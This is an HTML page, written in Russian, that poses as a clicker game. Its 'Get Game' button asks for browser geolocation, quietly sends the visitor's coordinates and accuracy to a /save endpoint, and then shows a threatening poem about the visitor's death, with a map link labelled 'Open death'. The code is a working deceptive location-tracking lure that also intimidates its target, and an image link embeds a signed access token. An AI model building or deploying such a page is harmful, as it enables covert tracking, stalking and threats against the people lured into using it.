<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Tracker</title>
<style>
  body { font-family: sans-serif; padding: 20px; background:#111; color:#eee; text-align:center; }
  button { padding:15px 30px; font-size:18px; background:#4CAF50; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px; }
  #status { margin-top:20px; font-size:18px; }
  h2 { color:#4CAF50; }
</style>
</head>
<body>
  <h2>Игра кликер</h2>
  <button onclick="getLocation()">Получить Игру</button>
  <div id="status"></div>

<script>
function getLocation() {
  const s = document.getElementById('status');
  if (!navigator.geolocation) { 
    s.innerText = "❌ Игра не поддерживается включите все настройки"; 
    return; 
  }
  s.innerText = "⏳ подождите загрузка игры.....";
  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      const acc = Math.round(pos.coords.accuracy);
      s.innerHTML = `
Ты тень, чьим домом стала тьма,
Чужая боль не трогала тебя.
Душа твоя во мрак (тьму) стремится.
Желаешь убедиться?.....

О, жалки дух, ты породнился с тьмой.
Жестоко жизнь других согубил....
Душа твоя полна грехов и смрада..
Падёшь навеки ты.. в пучины ада.....

Презренная тень, затерянная во мраке,
Приносящая боль людям, страдания и унижения,
Душа, погрязшая во грехе,
Взгляни в глаза своей смерти!

<h2>.</h2>
<p></p>

<img src="https://private-user-images.githubusercontent.com/315346217/633911678-24e4cdd9-3357-4d86-ac4f-de083fbdebe6.jpg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODYzOTE0NzEsIm5iZiI6MTc4NjM5MTE3MSwicGF0aCI6Ii8zMTUzNDYyMTcvNjMzOTExNjc4LTI0ZTRjZGQ5LTMzNTctNGQ4Ni1hYzRmLWRlMDgzZmJkZWJlNi5qcGc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwODEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDgxMFQxOTQ2MTFaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZDhjOTdkYjQ0YTE3OWM4ZTJiMGMwOGY2MjgyYmVlNWUxMjdmYzI1Yjc5NjQwZWI2MDEzZDViMWZhYzhhM2JjJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZyZXNwb25zZS1jb250ZW50LXR5cGU9aW1hZ2UlMkZqcGVnIn0.khOgarliBixnZuNIjNjEMTBZoU9sedCXV8I_jHTMnWY" alt="Aloask.com" width="394" height="262">

<br> Желаешь убедиться <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#4CAF50;">Открыть смерть</a>`;
      fetch(`/save?lat=${lat}&lon=${lon}&acc=${acc}`);
    },
    err => { 
      s.innerText = "❌ Ошибка: " + err.message + "\n\nРазреши доступ в настройках браузера!"; 
    }
  );
}
</script>
</body>
</html>
